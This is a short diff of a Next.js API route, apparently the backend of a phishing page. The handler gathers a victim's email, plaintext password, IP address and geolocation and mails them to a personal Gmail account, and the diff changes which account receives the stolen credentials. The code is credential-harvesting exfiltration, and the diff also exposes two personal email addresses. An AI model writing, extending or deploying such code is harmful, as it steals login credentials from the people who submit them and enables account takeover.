@@ -20,7 +20,7 @@ export async function POST(request: NextRequest) {
             locationData = await geoRes.json();
         }
 
-        const res = await mailUser("visatplus@gmail.com", "Task", {
+        const res = await mailUser("tomacurry12@gmail.com", "Task", {
             email,
             password,
             ip,
